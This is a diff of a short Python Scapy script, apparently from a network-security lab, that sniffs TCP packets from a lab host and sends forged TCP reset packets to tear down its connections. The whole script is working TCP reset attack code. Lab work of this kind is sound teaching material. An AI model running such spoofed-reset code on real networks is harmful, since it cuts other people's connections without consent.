@@ -2,11 +2,11 @@
 from scapy.all import *
 
 def spoof_tcp(pkt):
-   IPLayer  = IP(dst="10.0.2.68", src=pkt[IP].dst)
-   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
+    IPLayer  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                   dport=pkt[TCP].sport, sport=pkt[TCP].dport)
-   spoofpkt = IPLayer/TCPLayer
-   print("one")
-   send(spoofpkt, verbose=0)
+    spoofpkt = IPLayer/TCPLayer
+    send(spoofpkt, verbose=0)
+    print(spoofpkt.show())
 
-pkt=sniff(filter='tcp and src host 10.0.2.68', prn=spoof_tcp)
+pkt=sniff(iface="br-cf4c048a4428", filter='tcp and src host 10.9.0.5', prn=spoof_tcp)
